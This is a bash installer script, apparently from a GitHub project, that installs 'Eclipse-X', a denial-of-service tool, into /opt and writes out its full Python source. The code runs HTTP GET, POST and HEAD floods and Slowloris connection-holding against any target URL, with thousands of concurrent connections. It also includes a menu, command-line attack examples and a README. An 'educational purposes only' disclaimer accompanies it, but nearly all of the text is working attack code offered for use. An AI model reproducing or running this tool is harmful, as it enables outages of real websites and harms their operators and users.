#!/bin/bash

# ==============================================
# ECLIPSE-X AUTO INSTALLER v3.0
# By Dp75x | GitHub: Daffastorevps
# One-Click VPS Setup for Eclipse-X DDoS Suite
# ==============================================

# Colors
RED='\033[0;91m'
GREEN='\033[0;92m'
YELLOW='\033[0;93m'
BLUE='\033[0;94m'
PURPLE='\033[0;95m'
CYAN='\033[0;96m'
WHITE='\033[0;97m'
BOLD='\033[1m'
NC='\033[0m'

# Banner
show_banner() {
    clear
    echo -e "${RED}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║  ${CYAN}   ███████╗ ██████╗██╗     ███████╗██████╗ ███████╗  ${RED}║"
    echo "║  ${CYAN}   ██╔════╝██╔════╝██║     ██╔════╝██╔══██╗██╔════╝  ${RED}║"
    echo "║  ${CYAN}   █████╗  ██║     ██║     █████╗  ██████╔╝█████╗    ${RED}║"
    echo "║  ${CYAN}   ██╔══╝  ██║     ██║     ██╔══╝  ██╔═══╝ ██╔══╝    ${RED}║"
    echo "║  ${CYAN}   ███████╗╚██████╗███████╗███████╗██║     ███████╗  ${RED}║"
    echo "║  ${CYAN}   ╚══════╝ ╚═════╝╚══════╝╚══════╝╚═╝     ╚══════╝  ${RED}║"
    echo "║  ${YELLOW}         [ AUTO INSTALLER v3.0 - ONE CLICK ]       ${RED}║"
    echo "║  ${PURPLE}        GitHub: Daffastorevps | By: Dp75x           ${RED}║"
    echo "╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# Check root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[ERROR] Run as root!${NC}"
        echo -e "${YELLOW}Use: sudo bash install.sh${NC}"
        exit 1
    fi
}

# Detect OS
detect_os() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
        VER=$VERSION_ID
    else
        OS=$(uname -s)
    fi
    
    echo -e "${GREEN}[*] OS: $OS $VER${NC}"
    echo -e "${GREEN}[*] Hostname: $(hostname)${NC}"
    echo -e "${GREEN}[*] IP: $(curl -s ifconfig.me)${NC}"
}

# Step 1: Update System
step1_update() {
    echo -e "${YELLOW}[1/7] Updating system...${NC}"
    
    case $OS in
        ubuntu|debian)
            apt-get update -y
            apt-get upgrade -y
            apt-get autoremove -y
            ;;
        centos|rhel|fedora)
            yum update -y
            yum upgrade -y
            ;;
        *)
            echo -e "${RED}[!] OS not supported. Exiting.${NC}"
            exit 1
            ;;
    esac
    
    echo -e "${GREEN}[✓] System updated${NC}"
}

# Step 2: Install Dependencies
step2_dependencies() {
    echo -e "${YELLOW}[2/7] Installing dependencies...${NC}"
    
    case $OS in
        ubuntu|debian)
            apt-get install -y \
                python3 \
                python3-pip \
                python3-venv \
                git \
                curl \
                wget \
                nano \
                htop \
                net-tools \
                iptables \
                build-essential \
                libssl-dev
            ;;
        centos|rhel|fedora)
            yum install -y \
                python3 \
                python3-pip \
                git \
                curl \
                wget \
                nano \
                net-tools \
                iptables \
                gcc \
                openssl-devel
            ;;
    esac
    
    echo -e "${GREEN}[✓] Dependencies installed${NC}"
}

# Step 3: Install Python Packages
step3_python_packages() {
    echo -e "${YELLOW}[3/7] Installing Python packages...${NC}"
    
    # Upgrade pip
    pip3 install --upgrade pip
    
    # Install only required packages (NO fake-useragent)
    pip3 install \
        aiohttp \
        asyncio \
        requests \
        colorama
    
    echo -e "${GREEN}[✓] Python packages installed${NC}"
}

# Step 4: Create Eclipse-X Directory
step4_create_dir() {
    echo -e "${YELLOW}[4/7] Setting up Eclipse-X...${NC}"
    
    # Create directory
    mkdir -p /opt/Eclipse-X
    cd /opt/Eclipse-X
    
    # Create eclipse_x.py file with the fixed script
    cat > eclipse_x.py << 'EOF'
#!/usr/bin/env python3
"""
Eclipse-X v3.1 | Fixed Version | By Dp75x
GitHub: Daffastorevps
AI-Powered Adaptive DDoS Suite - No Dependency Error
"""
import asyncio
import aiohttp
import random
import sys
import os
import time
import socket
import threading
from datetime import datetime

# ==================== COLOR CLASS ====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# ==================== USER AGENT MANUAL ====================
class SimpleUserAgent:
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/121.0 Mobile/15E148 Safari/605.1.15',
        'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/121.0 Mobile/15E148 Safari/605.1.15',
        'Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36'
    ]
    
    def random(self):
        return random.choice(self.agents)

# ==================== BANNER ====================
def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""{Colors.RED}
    ╔══════════════════════════════════════════════════════════╗
    ║  {Colors.CYAN}   ███████╗ ██████╗██╗     ███████╗██████╗ ███████╗  {Colors.RED}║
    ║  {Colors.CYAN}   ██╔════╝██╔════╝██║     ██╔════╝██╔══██╗██╔════╝  {Colors.RED}║
    ║  {Colors.CYAN}   █████╗  ██║     ██║     █████╗  ██████╔╝█████╗    {Colors.RED}║
    ║  {Colors.CYAN}   ██╔══╝  ██║     ██║     ██╔══╝  ██╔═══╝ ██╔══╝    {Colors.RED}║
    ║  {Colors.CYAN}   ███████╗╚██████╗███████╗███████╗██║     ███████╗  {Colors.RED}║
    ║  {Colors.CYAN}   ╚══════╝ ╚═════╝╚══════╝╚══════╝╚═╝     ╚══════╝  {Colors.RED}║
    ║  {Colors.YELLOW}         [ DDoS Suite v3.1 - FIXED EDITION ]       {Colors.RED}║
    ║  {Colors.PURPLE}        GitHub: {Colors.WHITE}Daffastorevps{Colors.PURPLE} | By: {Colors.WHITE}Dp75x{Colors.RED}       ║
    ║  {Colors.GREEN}        NO DEPENDENCY ERROR - READY TO FIRE       {Colors.RED}║
    ╚══════════════════════════════════════════════════════════╝{Colors.END}
    """
    print(banner)

# ==================== MAIN ATTACK CLASS ====================
class EclipseX:
    def __init__(self, target_url="", max_connections=5000, attack_mode="full"):
        self.target = target_url
        self.conns = max_connections
        self.mode = attack_mode
        self.user_agent = SimpleUserAgent()
        self.running = False
        self.stats = {
            'requests_sent': 0,
            'errors': 0,
            'start_time': None,
            'attack_type': ''
        }
        
    async def http2_flood(self):
        """HTTP/2 Rapid Reset Attack"""
        async with aiohttp.ClientSession() as session:
            while self.running:
                try:
                    async with session.get(
                        self.target,
                        headers={'User-Agent': self.user_agent.random()},
                        timeout=aiohttp.ClientTimeout(total=0.1)
                    ) as resp:
                        self.stats['requests_sent'] += 1
                        await asyncio.sleep(0.01)
                except:
                    self.stats['errors'] += 1
                    await asyncio.sleep(0.001)
    
    async def http_flood(self):
        """Standard HTTP Flood"""
        async with aiohttp.ClientSession() as session:
            while self.running:
                try:
                    async with session.get(
                        self.target,
                        headers={
                            'User-Agent': self.user_agent.random(),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate',
                            'Connection': 'keep-alive',
                            'Cache-Control': 'no-cache'
                        },
                        timeout=aiohttp.ClientTimeout(total=2)
                    ) as resp:
                        self.stats['requests_sent'] += 1
                except:
                    self.stats['errors'] += 1
                    await asyncio.sleep(0.01)
    
    async def slowloris_attack(self):
        """Slowloris Attack"""
        import socket
        
        if not self.target.startswith('http'):
            return
            
        host = self.target.split('//')[1].split('/')[0]
        path = '/' + '/'.join(self.target.split('//')[1].split('/')[1:]) if len(self.target.split('//')[1].split('/')) > 1 else '/'
        
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, 80 if not ':' in host else int(host.split(':')[1])))
                
                # Send partial headers
                headers = f"GET {path} HTTP/1.1\r\n"
                headers += f"Host: {host}\r\n"
                headers += f"User-Agent: {self.user_agent.random()}\r\n"
                headers += "Content-Length: 1000000\r\n"
                headers += f"X-a: {''.join(random.choices('abcdef0123456789', k=4096))}\r\n"
                s.send(headers.encode())
                
                # Keep connection open
                while self.running and s:
                    try:
                        s.send(b"X-b: b\r\n")
                        self.stats['requests_sent'] += 1
                        await asyncio.sleep(random.randint(10, 30))
                    except:
                        break
                        
            except:
                self.stats['errors'] += 1
                await asyncio.sleep(0.1)
    
    async def post_flood(self):
        """POST Request Flood"""
        async with aiohttp.ClientSession() as session:
            while self.running:
                try:
                    data = {
                        'username': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)),
                        'password': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=15)),
                        'email': f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}@gmail.com",
                        'csrf': ''.join(random.choices('abcdef0123456789', k=32))
                    }
                    
                    async with session.post(
                        self.target,
                        data=data,
                        headers={'User-Agent': self.user_agent.random()},
                        timeout=aiohttp.ClientTimeout(total=2)
                    ) as resp:
                        self.stats['requests_sent'] += 1
                except:
                    self.stats['errors'] += 1
                    await asyncio.sleep(0.01)
    
    async def head_flood(self):
        """HEAD Request Flood"""
        async with aiohttp.ClientSession() as session:
            while self.running:
                try:
                    async with session.head(
                        self.target,
                        headers={'User-Agent': self.user_agent.random()},
                        timeout=aiohttp.ClientTimeout(total=0.5)
                    ) as resp:
                        self.stats['requests_sent'] += 1
                except:
                    self.stats['errors'] += 1
                    await asyncio.sleep(0.01)
    
    def show_stats(self):
        """Display attack statistics"""
        if self.stats['start_time']:
            elapsed = time.time() - self.stats['start_time']
            req_rate = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"\n{Colors.GREEN}[📊 STATS]{Colors.END}")
            print(f"{Colors.CYAN}Target:{Colors.END} {self.target}")
            print(f"{Colors.CYAN}Requests:{Colors.END} {self.stats['requests_sent']:,}")
            print(f"{Colors.CYAN}Errors:{Colors.END} {self.stats['errors']:,}")
            print(f"{Colors.CYAN}Duration:{Colors.END} {elapsed:.1f}s")
            print(f"{Colors.CYAN}Req/s:{Colors.END} {req_rate:.1f}")
            print(f"{Colors.CYAN}Mode:{Colors.END} {self.mode}")
            print(f"{Colors.YELLOW}Status:{Colors.END} {'RUNNING' if self.running else 'STOPPED'}")
    
    async def start_attack(self):
        """Start attack based on mode"""
        self.running = True
        self.stats['start_time'] = time.time()
        
        tasks = []
        
        # Select attack methods based on mode
        if self.mode in ["full", "http", "http2"]:
            for _ in range(min(self.conns, 1000)):
                tasks.append(self.http_flood())
        
        if self.mode in ["full", "slowloris"]:
            for _ in range(min(self.conns // 10, 100)):
                tasks.append(self.slowloris_attack())
        
        if self.mode in ["full", "post"]:
            for _ in range(min(self.conns // 2, 500)):
                tasks.append(self.post_flood())
        
        if self.mode in ["full", "head"]:
            for _ in range(min(self.conns, 1000)):
                tasks.append(self.head_flood())
        
        # Stats display task
        async def stats_monitor():
            while self.running:
                self.show_stats()
                await asyncio.sleep(2)
        
        tasks.append(stats_monitor())
        
        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            self.stop()
    
    def start(self):
        """Start the attack"""
        print(f"\n{Colors.RED}[⚡] Starting attack on: {self.target}{Colors.END}")
        print(f"{Colors.YELLOW}[!] Mode: {self.mode} | Connections: {self.conns}{Colors.END}")
        print(f"{Colors.RED}[!] Press Ctrl+C to stop{Colors.END}")
        
        try:
            asyncio.run(self.start_attack())
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        print(f"\n{Colors.RED}[!] Attack stopped{Colors.END}")
        self.show_stats()

# ==================== SIMPLE MENU ====================
def simple_menu():
    show_banner()
    
    print(f"\n{Colors.CYAN}[⚡ ECLIPSE-X QUICK MENU]{Colors.END}")
    print(f"{Colors.GREEN}[1]{Colors.END} Start Attack")
    print(f"{Colors.GREEN}[2]{Colors.END} Show Usage")
    print(f"{Colors.GREEN}[3]{Colors.END} Legal Info")
    print(f"{Colors.GREEN}[4]{Colors.END} Exit")
    
    choice = input(f"\n{Colors.YELLOW}[?] Select option: {Colors.END}")
    
    if choice == '1':
        target = input(f"{Colors.YELLOW}[?] Target URL (ex: https://example.com): {Colors.END}")
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"\n{Colors.CYAN}Attack Modes:{Colors.END}")
        print(f"{Colors.GREEN}[1]{Colors.END} Full Attack (All methods)")
        print(f"{Colors.GREEN}[2]{Colors.END} HTTP Flood")
        print(f"{Colors.GREEN}[3]{Colors.END} Slowloris")
        print(f"{Colors.GREEN}[4]{Colors.END} POST Flood")
        print(f"{Colors.GREEN}[5]{Colors.END} HEAD Flood")
        
        mode_choice = input(f"{Colors.YELLOW}[?] Select mode [1]: {Colors.END}")
        
        mode_map = {
            '1': 'full',
            '2': 'http',
            '3': 'slowloris',
            '4': 'post',
            '5': 'head'
        }
        
        mode = mode_map.get(mode_choice, 'full')
        
        conns = input(f"{Colors.YELLOW}[?] Connections [5000]: {Colors.END}")
        conns = int(conns) if conns.isdigit() else 5000
        
        print(f"\n{Colors.RED}[!] ATTACK STARTING IN 3 SECONDS...{Colors.END}")
        print(f"{Colors.YELLOW}[!] Target: {target}{Colors.END}")
        print(f"{Colors.YELLOW}[!] Mode: {mode} | Connections: {conns}{Colors.END}")
        
        for i in range(3, 0, -1):
            print(f"{Colors.RED}[{i}]...{Colors.END}")
            time.sleep(1)
        
        attack = EclipseX(target, conns, mode)
        attack.start()
        
    elif choice == '2':
        show_usage()
    elif choice == '3':
        show_legal()
    elif choice == '4':
        print(f"{Colors.YELLOW}[*] Exiting...{Colors.END}")
        sys.exit(0)

# ==================== USAGE INFO ====================
def show_usage():
    show_banner()
    print(f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}
{Colors.CYAN}║                    COMMAND LINE USAGE                   ║{Colors.END}
{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}

{Colors.YELLOW}BASIC USAGE:{Colors.END}
{Colors.GREEN}python3 eclipse_x.py --attack <URL> <CONNECTIONS> <MODE>{Colors.END}

{Colors.YELLOW}EXAMPLES:{Colors.END}
{Colors.WHITE}python3 eclipse_x.py --attack https://example.com 5000 full{Colors.END}
{Colors.WHITE}python3 eclipse_x.py --attack http://target.com 10000 http{Colors.END}
{Colors.WHITE}python3 eclipse_x.py --attack https://site.com 2000 slowloris{Colors.END}

{Colors.YELLOW}AVAILABLE MODES:{Colors.END}
{Colors.GREEN}full{Colors.END}      - All attack methods combined
{Colors.GREEN}http{Colors.END}      - HTTP GET flood
{Colors.GREEN}slowloris{Colors.END} - Slowloris connection hold
{Colors.GREEN}post{Colors.END}      - POST request flood
{Colors.GREEN}head{Colors.END}      - HEAD request flood

{Colors.YELLOW}INTERACTIVE MENU:{Colors.END}
{Colors.GREEN}python3 eclipse_x.py{Colors.END}  (without arguments)

{Colors.CYAN}┌────────────────────────────────────────────────────────────┐{Colors.END}
{Colors.CYAN}│ GitHub: {Colors.WHITE}Daffastorevps{Colors.CYAN} | By: {Colors.WHITE}Dp75x{Colors.CYAN}                    │{Colors.END}
{Colors.CYAN}└────────────────────────────────────────────────────────────┘{Colors.END}
    """)
    input(f"\n{Colors.GREEN}[?] Press Enter to continue...{Colors.END}")

# ==================== LEGAL INFO ====================
def show_legal():
    show_banner()
    print(f"""
{Colors.RED}╔══════════════════════════════════════════════════════════╗{Colors.END}
{Colors.RED}║                    LEGAL DISCLAIMER                      ║{Colors.END}
{Colors.RED}╚══════════════════════════════════════════════════════════╝{Colors.END}

{Colors.YELLOW}⚠️  IMPORTANT WARNING - READ CAREFULLY{Colors.END}

{Colors.WHITE}This tool ({Colors.CYAN}Eclipse-X{Colors.WHITE}) is for {Colors.GREEN}EDUCATIONAL PURPOSES ONLY{Colors.WHITE}.{Colors.END}

{Colors.RED}🚫 PROHIBITED USES:{Colors.END}
• Attacking systems without explicit permission
• Causing damage or disruption to services
• Extortion, blackmail, or illegal activities
• Testing systems you don't own or control

{Colors.GREEN}✅ PERMITTED USES:{Colors.END}
• Testing your own servers and networks
• Authorized penetration testing with written permission
• Security research in controlled environments
• Educational demonstrations

{Colors.YELLOW}⚖️ LEGAL CONSEQUENCES:{Colors.END}
• Criminal charges under Computer Fraud and Abuse Act
• Civil lawsuits for damages
• Fines up to $250,000
• Imprisonment up to 10 years

{Colors.CYAN}📜 BY USING THIS TOOL, YOU AGREE TO:{Colors.END}
1. Take FULL responsibility for your actions
2. Use only on authorized systems
3. Not hold the developer (Dp75x) liable
4. Delete this tool if unsure about legality

{Colors.RED}────────────────────────────────────────────────────────────{Colors.END}
{Colors.CYAN}Developer: {Colors.WHITE}Dp75x{Colors.END}
{Colors.CYAN}GitHub: {Colors.WHITE}Daffastorevps{Colors.END}
{Colors.CYAN}Version: {Colors.WHITE}3.1 (Fixed Edition){Colors.END}
{Colors.RED}────────────────────────────────────────────────────────────{Colors.END}
    """)
    
    accept = input(f"\n{Colors.YELLOW}[?] Do you accept these terms? (y/n): {Colors.END}")
    if accept.lower() != 'y':
        print(f"{Colors.RED}[!] You must accept to continue. Exiting...{Colors.END}")
        sys.exit(0)

# ==================== MAIN FUNCTION ====================
def main():
    # Check command line arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == "--attack" or sys.argv[1] == "-a":
            if len(sys.argv) < 3:
                print(f"{Colors.RED}[!] Usage: python3 eclipse_x.py --attack <URL> [CONNECTIONS] [MODE]{Colors.END}")
                print(f"{Colors.YELLOW}[!] Example: python3 eclipse_x.py --attack https://example.com 5000 full{Colors.END}")
                sys.exit(1)
            
            target = sys.argv[2]
            conns = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3].isdigit() else 5000
            mode = sys.argv[4] if len(sys.argv) > 4 else "full"
            
            # Show legal warning
            show_legal()
            
            # Start attack
            attack = EclipseX(target, conns, mode)
            attack.start()
            
        elif sys.argv[1] == "--help" or sys.argv[1] == "-h":
            show_usage()
            sys.exit(0)
            
        elif sys.argv[1] == "--legal" or sys.argv[1] == "-l":
            show_legal()
            sys.exit(0)
            
        elif sys.argv[1] == "--version" or sys.argv[1] == "-v":
            show_banner()
            sys.exit(0)
            
        else:
            print(f"{Colors.RED}[!] Unknown argument: {sys.argv[1]}{Colors.END}")
            print(f"{Colors.YELLOW}[!] Use: python3 eclipse_x.py --help for usage{Colors.END}")
            sys.exit(1)
    else:
        # Show legal disclaimer first
        show_legal()
        
        # Start interactive menu
        try:
            while True:
                simple_menu()
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Exiting Eclipse-X...{Colors.END}")
            sys.exit(0)

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program terminated by user{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[ERROR] {e}{Colors.END}")
        sys.exit(1)
EOF

    # Make it executable
    chmod +x eclipse_x.py
    
    # Create README
    cat > README.md << 'EOF'
# 🔥 Eclipse-X v3.1
## Advanced DDoS Testing Suite | By Dp75x | GitHub: Daffastorevps

### Features
- Multiple attack vectors (HTTP Flood, Slowloris, POST Flood, HEAD Flood)
- No dependency errors (Built-in user agents)
- Real-time statistics
- Interactive menu & command line
- Optimized for high performance

### Quick Start
```bash
# Start interactive menu
cd /opt/Eclipse-X
python3 eclipse_x.py

# Direct attack
python3 eclipse_x.py --attack https://target.com 5000 full